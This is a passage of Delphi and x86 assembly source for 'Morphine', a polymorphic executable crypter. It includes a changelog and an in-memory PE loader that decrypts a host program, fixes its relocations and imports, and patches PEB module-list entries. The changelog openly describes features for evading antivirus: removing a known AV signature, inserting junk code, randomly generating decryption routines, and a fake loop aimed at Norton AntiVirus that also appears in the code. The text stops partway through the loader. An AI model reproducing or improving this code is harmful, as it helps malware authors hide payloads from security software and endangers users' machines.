program morphine;
{$APPTYPE CONSOLE}

//if RUBBISH_NOPS defined, inserted rubbish are nops only (good for debugging)
{ $DEFINE RUBBISH_NOPS}
{ $DEFINE STATIC_CONTEXT}
uses Windows;

//ORIGINAL
//this is how our new PE loox like:
//
//CodeSection:
//0..$10: jmp GetProcAddress+jmp LoadLibrary+pad
//$10..$10+KeySize:Key
//$10+KeySize..$10+KeySize+sizeof(DynLoader):DynLoader
//$10+KeySize+sizeof(DynLoader): code
//
//DataSection:
//0..sizeof(host)-1: host
//
//ImportSection:
//0..$70-1: imports
//
//[TlsSection:]
//0..sizeof(tls): tls
//


//Changelog 1.2a
//moved import function jmps (getprocaddress, loadlibrary) to the end of initdata/polymorphic loader to
//prevent AV detection (code section started with ..000000FF2534.. which was a signature):
//implemented several variants of each jmp to import section (getprocaddress, loadlibrary) and added fixups

//this is how our new PE loox like:
//
//CodeSection:
//$0..KeySize:Key
//KeySize..KeySize+sizeof(DynLoader):DynLoader
//KeySize+sizeof(DynLoader): code
//
//DataSection:
//0..sizeof(host)-1: host
//
//ImportSection:
//0..$70-1: imports
//
//[TlsSection:]
//0..sizeof(tls): tls


//Changelog 1.2b
//- some random data (CoderRoller1) into encryption routine (DynCoder and Decoder)
//- data section eliminated (too risky to have it)
//- minor bug fixes
//
//this is how our new PE loox like:
//
//CodeSection:
//0: Rubbish
//KeyPtr..KeyPtr+KeySize:Key
//KeyPtr+KeySize..KeyPtr+KeySize+sizeof(DynLoader):DynLoader
//KeyPtr+KeySize+sizeof(DynLoader): code
//code+sizeof(code): host
//
//ImportSection:
//0..$70-1: imports
//
//[TlsSection:]
//0..sizeof(tls): tls

//Changelog 1.3
//- polycode liposuction
//- polycode instruction naming

//Changelog 1.4
//- DLL SUPPORT!!!
//- well some hacks are here, so nobody can say that the code is correct - see DynLoader
//- minor bugfixes
//+ .edata section after .tls

//Changelog 1.5
//- polycode improved

//Changelog 1.6
//- polycode shrinked
//- dynloader decrypts main data

//Changelog 1.7
//- secondary encryption routine has variable-length key

//Changelog 1.8
//- polycode shrinked

//Changelog 1.9
//- icon + XP manifest support

//Changelog 2.0
//- secondary encryption routine is randomly generated
//- resource support for DLLs
//- fake loop against Norton AntiVirus 

//Changelog 2.1
//- FSG 2.0 exe packer support

//Changelog 2.2
//- support for some other exe packers - Mew 1.1

//Changelog 2.3
//- fixed two serious bugz

//Changelog 2.4
//- better support for VB programs
//- support for end of file overlay data

//Changelog 2.5
//- bugfix in TLS support 

//Changelog 2.6
//- bugfix in TLS support number 2

//Changelog 2.7
//- better DLL handling -> support for NT4 DLLs

//if you need sum PEB, TEB structures (like in DynLoader)
//try look at these links:
//http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Thread/TEB.html
//http://undocumented.ntinternals.net/UserMode/Structures/LDR_MODULE.html
//http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Process/PEB.html


const
 //we need a dos stub
 //that's the common dos prog writing "This program cannot be run in DOS mode"
 DosStub:array[0..$38-1] of Byte=
 ($BA,$10,$00,$0E,$1F,$B4,$09,$CD,$21,$B8,$01,$4C,$CD,$21,$90,$90,
  $54,$68,$69,$73,$20,$70,$72,$6F,$67,$72,$61,$6D,$20,$6D,$75,$73,
  $74,$20,$62,$65,$20,$72,$75,$6E,$20,$75,$6E,$64,$65,$72,$20,$57,
  $69,$6E,$33,$32,$0D,$0A,$24,$37);

 //import section constants
 NumberOfDLL=1;                                 //number of dlls
 NumberOfImports=2;                             //number of funcs
 Kernel32Name='kernel32.dll';                   //name of dll
 NtdllName='ntdll.dll';                         //name of ntdll.dll

 GetProcAddressName='GetProcAddress';           //name of funct1
 LoadLibraryName='LoadLibraryA';                //name of func2
 Kernel32Size=12;                               //length of dll name
 GetProcAddressSize=14;                         //length of func1 name
 LoadLibrarySize=12;                            //length of func2 name

 //polymorphic instruction indexes
 PII_BEGIN                      = 0;

 PII_POLY_BEGIN                 = PII_BEGIN;
 PII_POLY_PUSHAD                = PII_POLY_BEGIN;
 PII_POLY_MOV_REG_LOADER_SIZE   = PII_POLY_PUSHAD+1;
 PII_POLY_MOV_REG_LOADER_ADDR   = PII_POLY_MOV_REG_LOADER_SIZE+1;

 PII_CODER_BEGIN                = PII_POLY_MOV_REG_LOADER_ADDR+1;
 PII_CODER_CALL_GET_EIP         = PII_CODER_BEGIN+1;
 PII_CODER_GET_EIP              = PII_CODER_CALL_GET_EIP+1;
 PII_CODER_FIX_DST_PTR          = PII_CODER_GET_EIP+1;
 PII_CODER_KEY_START            = PII_CODER_FIX_DST_PTR+1;
 PII_CODER_MOV_REG_KEY          = PII_CODER_KEY_START;
 PII_CODER_FIX_SRC_PTR          = PII_CODER_MOV_REG_KEY+1;

 PII_CODER_CODE                 = PII_CODER_FIX_SRC_PTR+1;
 PII_CODER_LOAD_KEY_TO_REG      = PII_CODER_CODE;
 PII_CODER_TEST_KEY_END         = PII_CODER_LOAD_KEY_TO_REG+1;
 PII_CODER_JZ_CODER_BEGIN       = PII_CODER_TEST_KEY_END+1;
 PII_CODER_ADD_DATA_IDX         = PII_CODER_JZ_CODER_BEGIN+1;
 PII_CODER_XOR_DATA_REG         = PII_CODER_ADD_DATA_IDX+1;
 PII_CODER_STORE_DATA           = PII_CODER_XOR_DATA_REG+1;
 PII_CODER_INC_SRC_PTR          = PII_CODER_STORE_DATA+1;
 PII_CODER_LOOP_CODER_CODE      = PII_CODER_INC_SRC_PTR+1;
 PII_CODER_END                  = PII_CODER_LOOP_CODER_CODE+1;

 PII_POLY_JMP_DYNLOADER         = PII_CODER_END+1;
 PII_POLY_END                   = PII_POLY_JMP_DYNLOADER;
 PII_END                        = PII_POLY_END;

 //other consts
 MaxPolyCount=20;                               //maximum variants for one instruction
 InitInstrCount=PII_END+1;                      //polymorphic loader instruction count
 RawDataAlignment=$200;                         //alignment of SizeOfRawData
 DosStubEndSize=$88;                            //$100 - SizeOf(DosStub)

 //image type const
 IMAGE_TYPE_EXE=0;
 IMAGE_TYPE_DLL=1;
 IMAGE_TYPE_SYS=2;
 IMAGE_TYPE_UNKNOWN=$FFFFFFFF;

 //this dword is at the end of DYN_LOADER in decoded form
 DYN_LOADER_END_MAGIC=$C0DEC0DE;
 DYN_LOADER_DEC_MAGIC=$1EE7C0DE;

 //registers
 REG_EAX=0;
 REG_ECX=1;
 REG_EDX=2;
 REG_EBX=3;
 REG_ESP=4;
 REG_EBP=5;
 REG_ESI=6;
 REG_EDI=7;
 REG_NON=255;

 Reg8Count=8;
 Reg16Count=8;
 Reg32Count=8;

 RT_XP_MANIFEST=24;

type
 //now several types i was unable to find in std windows.pas
 //and was so lazy to use more units :o)

 PImageImportByName=^TImageImportByName;
 TImageImportByName=packed record
  Hint:Word;
  Name:array of Char;
 end;
 PImageThunkData=^TImageThunkData;
 TImageThunkData=packed record
  case Byte of
   0:(ForwarderString:PByte);
   1:(FunctionPtr:PCardinal);
   2:(Ordinal:Cardinal);
   3:(AddressOfData:PImageImportByName);
 end;
 PImageImportDescriptor=^TImageImportDescriptor;
 TImageImportDescriptor=packed record
  case Byte of
   0:(Characteristics,cTimeDateStamp,cForwarderChain,cName:Cardinal;cFirstThunk:PImageThunkData);
   1:(OriginalFirstThunk:PImageThunkData;oTimeDateStamp,oForwarderChain,oName:Cardinal;oFirstThunk:PImageThunkData);
 end;

 PExportDirectoryTable=^TExportDirectoryTable;
 TExportDirectoryTable=packed record
  Flags,TimeStamp:Cardinal;
  MajorVersion,MinorVersion:Word;
  NameRVA,OrdinalBase,AddressTableEntries,NumberOfNamePointers,ExportAddressTableRVA,
  NamePointerRVA,OrdinalTableRVA:Cardinal;
 end;

 //that's how .tls section loox like
 PTlsSectionData=^TTlsSectionData;
 TTlsSectionData=packed record
  RawDataStart,RawDataEnd,AddressOfIndex,AddressOfCallbacks,SizeOfZeroFill,Characteristics:Cardinal;
 end;

 //our type for all about tls section
 TTlsCopy=record
  Directory:PImageDataDirectory;
  SectionData:PTlsSectionData;
  RawData:Pointer;
  RawDataLen,Index:Cardinal;
  Callbacks:Pointer;
  CallbacksLen:Cardinal;
 end;

 //one pseudo-instruction (p-i) from polymorphic engine (can contain more than one x86 instruction)
 TInstruction=packed record
  Len:Byte;                                     //opcode length
  Fix1,Fix2,Fix3,Fix4:Byte;                     //bytes indexes for fixup
  Code:array[0..30] of Char;                    //opcode
 end;

 //a list of p-i, we will chose one each time and put it into a code
 TVarInstruction=packed record
  Count,Index:Byte;                             //number of p-i and number of the chosen
  VirtualAddress:Cardinal;                      //address of instruction in CODE section
  Vars:array[0..MaxPolyCount-1] of TInstruction;//the list
 end;

 PResourceDirectoryTable=^TResourceDirectoryTable;
 TResourceDirectoryTable=packed record
  Characteristics:Cardinal;
  TimeDateStamp:Cardinal;
  MajorVersion:Word;
  MinorVersion:Word;
  NumberOfNameEntries:Word;
  NumberOfIDEntries:Word;
 end;

 PResourceDirectoryEntry=^TResourceDirectoryEntry;
 TResourceDirectoryEntry=packed record
  NameID:Cardinal;
  SubdirDataRVA:Cardinal;
 end;

 PResourceDataEntry=^TResourceDataEntry;
 TResourceDataEntry=packed record
  DataRVA:Cardinal;
  Size:Cardinal;
  Codepage:Cardinal;
  Reserved:Cardinal;
 end;

 PResourceTableDirectoryEntry=^TResourceTableDirectoryEntry;
 TResourceTableDirectoryEntry=packed record
  Table:TResourceDirectoryTable;
  Directory:TResourceDirectoryEntry;
 end;

 PIconDirectoryEntry=^TIconDirectoryEntry;
 TIconDirectoryEntry=packed record
  Width:Byte;
  Height:Byte;
  ColorCount:Byte;
  Reserved:Byte;
  Planes:Word;
  BitCount:Word;
  BytesInRes:Cardinal;
  ID:Word;
 end;

 PIconDirectory=^TIconDirectory;
 TIconDirectory=packed record
  Reserved:Word;
  ResType:Word;
  Count:Word;
  Entries:array[0..31] of TIconDirectoryEntry;
 end;

 TImageType=(itExe,itDLL,itSys);

 TEncoderProc=function(AAddr:Pointer):Cardinal; stdcall;

var
 DosHeader:TImageDosHeader;
 DosStubEnd:array[0..DosStubEndSize-1] of Char;
 NtHeaders:TImageNtHeaders;
 FileHandle,MainFile:THandle;
 InputFileName,OutputFileName,Options:string;
 NumBytes,TotalFileSize,MainSize,LoaderSize,VirtLoaderData,VirtMainData,VirtKey,InitSize,KeyPtr,
 AnyDWORD,LoaderPtr,TlsSectionSize,Delta,HostImageBase,HostSizeOfImage,HostCharacteristics,
 ReqImageBase,RandomValue,ExportSectionSize,CurVirtAddr,CurRawData,ExportRVADelta,
 HostExportSectionVirtualAddress,ExportNamePointerRVAOrg,ExportAddressRVAOrg,
 ImportSectionDataSize,HostImportSectionSize,ImportSectionDLLCount,
 HostImportSectionVirtualAddress,InitcodeThunk,CodeSectionVirtualSize,LoaderRealSize,
 MainRealSize,MainRealSize4,LogCnt,MainDataDecoderLen,DynLoaderDecoderOffset,LdrPtrCode,LdrPtrThunk,
 ResourceSectionSize,HostResourceSectionSize,ResourceIconGroupDataSize,HostResourceSectionVirtualAddress,
 ResourceXPMDirSize,AfterImageOverlaysSize:Cardinal;
 CodeSection,ExportSection,TlsSection,ImportSection,ResourceSection:TImageSectionHeader;
 ImportDesc,NullDesc:TImageImportDescriptor;
 PImportDesc:PImageImportDescriptor;
 ThunkGetProcAddress,ThunkLoadLibrary:TImageThunkData;
 NullWord,KeySize,TrashSize,Trash2Size,HostSubsystem:Word;
 MainData,MainDataCyp,LoaderData,Key,InitData,Trash,Trash2,Ptr,ExportData,ImportSectionData,ResourceData,
 MainDataEncoder,MainDataDecoder,AfterImageOverlays:Pointer;
 PB,PB2,PB3,PB4,DynLoaderSub,LdrPtr,MainDataDecPtr:PByte;
 TlsSectionPresent,ExportSectionPresent,Quiet,DynamicDLL,ResourceSectionPresent,SaveIcon,
 SaveOverlay,OverlayPresent:Boolean;
 TlsCopy:TTlsCopy;
 TlsSectionData:TTlsSectionData;
 ImageType:TImageType;
 I:Integer;
 DynLoaderJmp:PCardinal;
 ResourceRoot,ResourceIconGroup,ResourceXPManifest:PResourceDirectoryTable;
 ResourceDirEntry:PResourceDirectoryEntry;
 EncoderProc:TEncoderProc;

procedure DynLoader; assembler; stdcall;
//THE LOADER!
//this loads pe file to memory from MainData
//fixup relocations
//fixup imports
//fixup exports
//doesn't protect pages - cuz we don't need this !?
//
asm
  push 012345678h               //LoadLibrary
  push 012345678h               //GetProcAddress
  push 012345678h               //Addr of MainData
  //now lil hack
  //we use rva for maindata, but we don't know image base
  //we get eip and and it with 0FFFFF000h which does
  //from 000401XXXh something like 000401000h that's why we
  //have to be sure this code is not after 2000h, but WE DO know it
  call @get_eip
  @get_eip:
  pop eax
  and eax,0FFFFF000h
  add [esp],eax
  add [esp+004h],eax
  add [esp+008h],eax

  call @DynLoader_begin

  //one more hack here
  //code in LoadLibrary that call DllMain saves its esp into esi
  //but we modify esi a lot and we shouldn't do this, also ebp for NT4 is need to safe
  //but we can fix this up, cuz we know we left esp and it has right value
  //so add sum 010h for DllMain params + ret addr and here we go
//  mov esi,esp
  //popad without eax and ecx
  pop edi
  pop esi
  pop ebp
  add esp,004h
  pop ebx
  pop edx
  add esp,008h

  mov [esp+004h],ecx            //change DllMain.hinstDLL
//  int 3
  jmp eax                       //jump to entrypoint

 @DynLoader_begin:
  //we've got image base in eax (except ax), save it to ebp-050h
  push ebp
  mov ebp,esp
  sub esp,00000200h
  {
   -01F8..-0100 -       NtHeaders:TImageNtHeaders
   -09C         -       MemoryBasicInformation.BaseAddress
   -098         -       MemoryBasicInformation.AllocationBase
   -094         -       MemoryBasicInformation.AllocationProtect
   -090         -       MemoryBasicInformation.RegionSize
   -08C         -       MemoryBasicInformation.State
   -088         -       MemoryBasicInformation.Protect
   -084         -       MemoryBasicInformation.Type

   -07C         -       IsBadReadPtr:Pointer
   -078         -       VirtualQuery:Pointer
   -074         -       VirtualProtect:Pointer
   -070         -       FirstModule:Cardinal

   -054         -       OrgImageSize:Cardinal
   -050         -       ImageBase:Cardinal
   -04C         -       ImageEntryPoint:Cardinal
   -048         -       ImageSize:Cardinal
   -044         -       ImageType:Cardinal
   -040         -       HintName:Cardinal
   -03C         -       Thunk:Cardinal
   -038..-010   -       Section:TImageSectionHeader
   -00C         -       FileData:Pointer
   -008         -       ImageSizeOrg:Cardinal
   -004         -       ImageBaseOrg:Cardinal
   +008         -       AddrOfMainData:Pointer
   +00C         -       GetProcAddress:Pointer
   +010         -       LoadLibrary:Pointer
  }
  push ebx                              //save ebx, edi, esi
  push edi
  push esi

  and eax,0FFFF0000h

  mov [ebp-050h],eax                    //save ImageBase

  mov ecx,00008000h
 @DynLoader_fake_loop:
  add eax,0AF631837h
  xor ebx,eax
  add bx,ax
  rol ebx,007h
  loop @DynLoader_fake_loop
  //HERE you can insert our own crypto routine
  //esp and ebp should not be changed
  push dword ptr [ebp+008h]             //AAddr
  dd DYN_LOADER_DEC_MAGIC
  //\end of crypto routine

  call @DynLoader_fill_image_info

  push 000h
  push 06C6C642Eh
  push 032336C65h
  push 06E72656Bh                       //kernel32.dll on stack
  push esp                              //lpLibFileName
  mov eax,[ebp+010h]                    //ImportThunk.LoadLibrary
  call [eax]                            //LoadLibrary
  add esp,010h
  mov edi,eax

  push 000h
  push 0636F6C6Ch
  push 0416C6175h
  push 074726956h                       //VirtualAlloc on stack
  push esp                              //lpProcName
  push eax                              //hModule
  mov eax,[ebp+00Ch]                    //ImportThunk.GetProcAddress
  call [eax]                            //GetProcAddress
  add esp,010h
  mov ebx,eax
  test eax,eax
  jz @DynLoader_end

  push 000007463h
  push 065746f72h
  push 0506C6175h
  push 074726956h                       //VirtualProtect on stack
  push esp                              //lpProcName
  push edi                              //hModule
  mov eax,[ebp+00Ch]                    //ImportThunk.GetProcAddress
  call [eax]                            //GetProcAddress
  add esp,010h
  mov [ebp-074h],eax                    //VirtualProtect
  test eax,eax
  jz @DynLoader_end

  push 000h
  push 079726575h
  push 0516C6175h
  push 074726956h                       //VirtualQuery on stack
  push esp                              //lpProcName
  push edi                              //hModule
  mov eax,[ebp+00Ch]                    //ImportThunk.GetProcAddress
  call [eax]                            //GetProcAddress
  add esp,010h
  mov [ebp-078h],eax                    //VirtualQuery
  test eax,eax
  jz @DynLoader_end

  push 000h
  push 072745064h
  push 061655264h
  push 061427349h                       //IsBadReadPtr on stack
  push esp                              //lpProcName
  push edi                              //hModule
  mov eax,[ebp+00Ch]                    //ImportThunk.GetProcAddress
  call [eax]                            //GetProcAddress
  add esp,010h
  mov [ebp-07Ch],eax                    //IsBadReadPtr
  test eax,eax
  jz @DynLoader_end


  lea edi,[ebp-01F8h]                   //NtHeaders
  push edi
  mov esi,[ebp+008h]                    //TImageDosHeader
  add esi,[esi+03Ch]                    //TImageDosHeader._lfanew
  push 03Eh                             //SizeOf(NtHeaders) div 4
  pop ecx
  rep movsd
  pop edi
  mov eax,[edi+034h]                    //NtHeaders.OptionalHeader.ImageBase
  mov [ebp-004h],eax                    //ImageBaseOrg
  mov ecx,[edi+050h]                    //NtHeaders.OptionalHeader.SizeOfImage
  mov [ebp-008h],ecx                    //ImageSizeOrg

  push ecx
  push PAGE_EXECUTE_READWRITE           //flProtect
  push MEM_COMMIT or MEM_RESERVE        //flAllocationType
  push ecx                              //dwSize
  push eax                              //lpAddress
  call ebx                              //VirtualAlloc
  pop ecx
  test eax,eax
  jnz @DynLoader_alloc_done

  push PAGE_EXECUTE_READWRITE           //flProtect
  push MEM_COMMIT                       //flAllocationType
  push ecx                              //dwSize
  push eax                              //lpAddress
  call ebx                              //VirtualAlloc
  test eax,eax
  jz @DynLoader_end

 @DynLoader_alloc_done:
  mov [ebp-00Ch],eax                    //FileData
  mov edi,eax
  mov esi,[ebp+008h]                    //TImageDosHeader
  push esi
  mov ecx,esi                           //TImageDosHeader
  add ecx,[esi+03Ch]                    //+TImageDosHeader._lfanew = NtHeaders
  mov ecx,[ecx+054h]                    //NtHeaders.SizeOfHeaders
  rep movsb
  pop esi
  add esi,[esi+03Ch]                    //TImageNtHeaders
  add esi,0F8h                          //+SizeOf(TImageNtHeaders) = section headers

 @DynLoader_LoadSections:
  mov eax,[ebp+008h]                    //TImageDosHeader
  add eax,[eax+03Ch]                    //TImageDosHeader._lfanew
  movzx eax,[eax+006h]                  //NtHeaders.FileHeader.NumberOfSections

 @DynLoader_LoadSections_do_section:
  lea edi,[ebp-038h]                    //Section
  push edi
  push 00Ah                             //SizeOf(TImageSectionHeader) div 4
  pop ecx
  rep movsd
  pop edi

 @DynLoader_LoadSections_copy_data:
  mov edx,[edi+014h]                    //Section.PointerToRawData
  test edx,edx
  jz @DynLoader_LoadSections_next_section
  push esi
  mov esi,[ebp+008h]                    //AHostAddr
  add esi,edx                           //AHostAddr + Section.PointerToRawData
  mov ecx,[edi+010h]                    //Section.SizeOfRawData
  mov edx,[edi+00Ch]                    //Section.VirtualAddress
  mov edi,[ebp-00Ch]                    //FileData
  add edi,edx                           //FileData + Section.VirtualAddress
  rep movsb
  pop esi
 @DynLoader_LoadSections_next_section:
  dec eax
  jnz @DynLoader_LoadSections_do_section

  mov edx,[ebp-00Ch]                    //FileData
  sub edx,[ebp-004h]                    //Delta = FileData - ImageBaseOrg
  je @DynLoader_PEBTEBFixup

 @DynLoader_RelocFixup:
  mov eax,[ebp-00Ch]                    //FileData
  mov ebx,eax
  add ebx,[ebx+03Ch]                    //TImageDosHeader._lfanew
  mov ebx,[ebx+0A0h]                    //IMAGE_DIRECTORY_ENTRY_BASERELOC.VirtualAddress
  test ebx,ebx
  jz @DynLoader_PEBTEBFixup
  add ebx,eax
 @DynLoader_RelocFixup_block:
  mov eax,[ebx+004h]                    //ImageBaseRelocation.SizeOfBlock
  test eax,eax
  jz @DynLoader_PEBTEBFixup
  lea ecx,[eax-008h]                    //ImageBaseRelocation.SizeOfBlock - SizeOf(TImageBaseRelocation)
  shr ecx,001h                          //(ImageBaseRelocation.SizeOfBlock - SizeOf(TImageBaseRelocation)) div SizeOf(Word)
  lea edi,[ebx+008h]                    //PImageBaseRelocation + SizeOf(TImageBaseRelocation)
 @DynLoader_RelocFixup_do_entry:
  movzx eax,word ptr [edi]              //Entry
  push edx
  mov edx,eax
  shr eax,00Ch                          //Type = Entry shr 12

  mov esi,[ebp-00Ch]                    //FileData
  and dx,00FFFh
  add esi,[ebx]                         //FileData + ImageBaseRelocation.VirtualAddress
  add esi,edx                           //FileData + ImageBaseRelocation.VirtualAddress+Entry and $0FFF
  pop edx

 @DynLoader_RelocFixup_HIGH:
  dec eax
  jnz @DynLoader_RelocFixup_LOW
  mov eax,edx
  shr eax,010h                          //HiWord(Delta)
  jmp @DynLoader_RelocFixup_LOW_fixup
 @DynLoader_RelocFixup_LOW:
  dec eax
  jnz @DynLoader_RelocFixup_HIGHLOW
  movzx eax,dx                          //LoWord(Delta)
 @DynLoader_RelocFixup_LOW_fixup:
  add word ptr [esi],ax
  jmp @DynLoader_RelocFixup_next_entry
 @DynLoader_RelocFixup_HIGHLOW:
  dec eax
  jnz @DynLoader_RelocFixup_next_entry
  add [esi],edx

 @DynLoader_RelocFixup_next_entry:
  inc edi
  inc edi                               //Inc(Entry)
  loop @DynLoader_RelocFixup_do_entry

 @DynLoader_RelocFixup_next_base:
  add ebx,[ebx+004h]                    //ImageBaseRelocation + ImageBaseRelocation.SizeOfBlock
  jmp @DynLoader_RelocFixup_block

 @DynLoader_PEBTEBFixup:
  //we have some bad pointers in InLoadOrderModuleList, we have to change the base of our module
  //and if we are executable (not dll) we have to change base address in PEB too
  //for VB programs we need to do it now, because its libraries is reading this stuff
  //in ImportFixup section
//  int 3
  mov ecx,[ebp-00Ch]                    //FileData
  mov edx,[ebp-050h]                    //ImageBase
  add [ebp-04Ch],edx                    //ImageEntryPoint

  mov eax,fs:[000000030h]               //TEB.PPEB
  cmp dword ptr [ebp-044h],IMAGE_TYPE_EXE //check image type = IMAGE_TYPE_EXE
  jnz @DynLoader_in_module_list
  mov [eax+008h],ecx                    //PEB.ImageBaseAddr -> rewrite old imagebase
 @DynLoader_in_module_list:
  mov eax,[eax+00Ch]                    //PEB.LoaderData
  mov eax,[eax+00Ch]                    //LoaderData.InLoadOrderModuleList

  //now find our module in the list (same base, same size and same entry point)
  mov esi,eax                           //first record

 @DynLoader_in_module_list_one:
  mov edx,[eax+018h]                    //InLoadOrderModuleList.BaseAddress
  cmp edx,[ebp-050h]                    //ImageBase
  jnz @DynLoader_in_module_list_next
  mov edx,[eax+01Ch]                    //InLoaderOrderModuleList.EntryPoint
  cmp edx,[ebp-04Ch]                    //ImageEntryPoint
  jnz @DynLoader_in_module_list_next
  mov edx,[eax+020h]                    //InLoaderOrderModuleList.SizeOfImage
  cmp edx,[ebp-048h]                    //ImageSize
  jnz @DynLoader_in_module_list_next
  mov [eax+018h],ecx                    //InLoadOrderModuleList.BaseAddress -> rewrite old imagebase
  add ecx,[ebp-01D0h]                   //+NtHeaders.OptionalHeader.AddressOfEntryPoint
  mov [eax+01Ch],ecx                    //InLoadOrderModuleList.EntryPoint -> rewrite old entrypoint
  mov ecx,[ebp-01A8h]                   //NtHeaders.OptionalHeader.SizeOfImage
  mov [eax+020h],ecx                    //InLoaderOrderModuleList.SizeOfImage -> rewrite old sizeofimage
  jmp @DynLoader_ImportFixup

 @DynLoader_in_module_list_next:
  cmp [eax],esi                         //InLoadOrderModuleList.Flink ?= first record
  jz @DynLoader_ImportFixup
  mov eax,[eax]                         //record = InLoadOrderModuleList.Flink
  jmp @DynLoader_in_module_list_one


 @DynLoader_ImportFixup:
  mov ebx,[ebp-0178h]                   //NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
  test ebx,ebx
  jz @DynLoader_export_fixup
  mov esi,[ebp-00Ch]                    //FileData
  add ebx,esi                           //FileData + NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
 @DynLoader_ImportFixup_module:
  mov eax,[ebx+00Ch]                    //TImageImportDescriptor.Name
  test eax,eax
  jz @DynLoader_export_fixup

  mov ecx,[ebx+010h]                    //TImageImportDescriptor.FirstThunk
  add ecx,esi
  mov [ebp-03Ch],ecx                    //Thunk
  mov ecx,[ebx]                         //TImageImportDescriptor.Characteristics
  test ecx,ecx
  jnz @DynLoader_ImportFixup_table
  mov ecx,[ebx+010h]
 @DynLoader_ImportFixup_table:
  add ecx,esi
  mov [ebp-040h],ecx                    //HintName
  add eax,esi                           //TImageImportDescriptor.Name + FileData = ModuleName
  push eax                              //lpLibFileName
  mov eax,[ebp+010h]                    //ImportThunk.LoadLibrary
  call [eax]                            //LoadLibrary
  test eax,eax
  jz @DynLoader_end
  mov edi,eax
 @DynLoader_ImportFixup_loop:
  mov ecx,[ebp-040h]                    //HintName
  mov edx,[ecx]                         //TImageThunkData.Ordinal
  test edx,edx
  jz @DynLoader_ImportFixup_next_module
  test edx,080000000h                   //import by ordinal ?
  jz @DynLoader_ImportFixup_by_name
  and edx,07FFFFFFFh                    //get ordinal
  jmp @DynLoader_ImportFixup_get_addr
 @DynLoader_ImportFixup_by_name:
  add edx,esi                           //TImageThunkData.Ordinal + FileData = OrdinalName
  inc edx
  inc edx                               //OrdinalName.Name
 @DynLoader_ImportFixup_get_addr:
  push edx                              //lpProcName
  push edi                              //hModule
  mov eax,[ebp+00Ch]                    //ImportThunk.GetProcAddress
  call [eax]                            //GetProcAddress
  mov ecx,[ebp-03Ch]                    //HintName
  mov [ecx],eax
  add dword ptr [ebp-03Ch],004h         //Thunk -> next Thunk
  add dword ptr [ebp-040h],004h         //HintName -> next HintName
  jmp @DynLoader_ImportFixup_loop
 @DynLoader_ImportFixup_next_module:
  add ebx,014h                          //SizeOf(TImageImportDescriptor)
  jmp @DynLoader_ImportFixup_module

 @DynLoader_export_fixup:
  //go through all loaded modules and search for IAT section for our module
  //then change image base in all imports there
//  int 3
  mov eax,fs:[000000030h]               //TEB.PPEB
  mov eax,[eax+00Ch]                    //PEB.LoaderData
  mov ebx,[eax+00Ch]                    //LoaderData.InLoadOrderModuleList
  mov [ebp-070h],ebx                    //FirstModule

 @DynLoader_export_fixup_process_module:
  mov edx,[ebx+018h]                    //InLoadOrderModuleList.BaseAddress
  cmp edx,[ebp-050h]                    //ImageBase
  jz @DynLoader_export_fixup_next

  push edx
  push 004h                             //ucb
  push edx                              //lp
  call [ebp-07Ch]                       //IsBadReadPtr
  pop edx
  test eax,eax
  jnz @DynLoader_export_fixup_next

  mov edi,edx
  add edi,[edi+03Ch]                    //TImageDosHeader._lfanew
  mov edi,[edi+080h]                    //TImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
  test edi,edi
  jz @DynLoader_export_fixup_next
  add edi,edx                           //+ module.ImageBase
 @DynLoader_export_fixup_check_idt:
  xor eax,eax
  push edi
  push 005h                             //sizeof(ImportDirectoryTable)/4
  pop ecx
  rep scasd                             //test for null Directory Entry
  pop edi
  jz @DynLoader_export_fixup_next

  mov esi,[edi+010h]                    //ImportSection.ImportAddressTableRVA
  add esi,[ebx+018h]                    //+ module.ImageBase
  mov eax,[esi]                         //first IAT func address
  sub eax,[ebp-050h]                    //- ImageBase
  jb @DynLoader_export_fixup_next_idir  //this is not our import
  cmp eax,[ebp-048h]                    //ImageSize
  jbe @DynLoader_export_fixup_prefixaddr //this is our import

 @DynLoader_export_fixup_next_idir:
  add edi,014h                          //+ sizeof(IDT) = next IDT
  jmp @DynLoader_export_fixup_check_idt

 @DynLoader_export_fixup_prefixaddr:
  push 01Ch                             //dwLength = sizeof(MemoryBasicInformation)
  lea eax,[ebp-09Ch]                    //MemoryBasicInformation
  push eax                              //lpBuffer
  push esi                              //lpAddress
  call [ebp-078h]                       //VirtualQuery

  lea eax,[ebp-088h]                    //MemoryBasicInformation.Protect
  push eax                              //lpflOldProtect
  push PAGE_READWRITE                   //flNewProtect
  push dword ptr [ebp-090h]             //dwSize = MemoryBasicInformation.RegionSize
  push dword ptr [ebp-09Ch]             //lpAddress = MemoryBasicInformation.BaseAddress
  call [ebp-074h]                       //VirtualProtect
  test eax,eax
  jz @DynLoader_export_fixup_next

  push edi
  mov edi,esi
 @DynLoader_export_fixup_fixaddr:
  lodsd
  test eax,eax
  jz @DynLoader_export_fixup_protect_back
  sub eax,[ebp-050h]                    //- ImageBase
  add eax,[ebp-00Ch]                    //+ FileData
  stosd
  jmp @DynLoader_export_fixup_fixaddr

 @DynLoader_export_fixup_protect_back:
  lea eax,[ebp-084h]                    //MemoryBasicInformation.Type (just need some pointer)
  push eax                              //lpflOldProtect
  push dword ptr [ebp-088h]             //flNewProtect = MemoryBasicInformation.Protect
  push dword ptr [ebp-090h]             //dwSize = MemoryBasicInformation.RegionSize
  push dword ptr [ebp-09Ch]             //lpAddress = MemoryBasicInformation.BaseAddress
  call [ebp-074h]                       //VirtualProtect
  pop edi
  jmp @DynLoader_export_fixup_next_idir

 @DynLoader_export_fixup_next:
  mov ebx,[ebx]
  cmp ebx,[ebp-070h]                    //InLoadOrderModuleList.Flink ?= FirstModule
  jnz @DynLoader_export_fixup_process_module

 @DynLoader_run:
//  int 3
  mov eax,[ebp-01D0h]                   //NtHeaders.OptionalHeader.AddressOfEntryPoint
  add eax,[ebp-00Ch]                    //NtHeaders.OptionalHeader.AddressOfEntryPoint + FileData = EntryPoint

 @DynLoader_end:
  mov ecx,[ebp-00Ch]                    //we need FileData
  pop esi
  pop edi
  pop ebx
  leave
  ret 00Ch

 @DynLoader_fill_image_info:
  //these values give info about our image, info is filled before DynLoader is put into
  //final executable, we find their offset going from DynLoader_end searching for DYN_LOADER_END_MAGIC
  mov [ebp-044h],012345678h             //ImageType
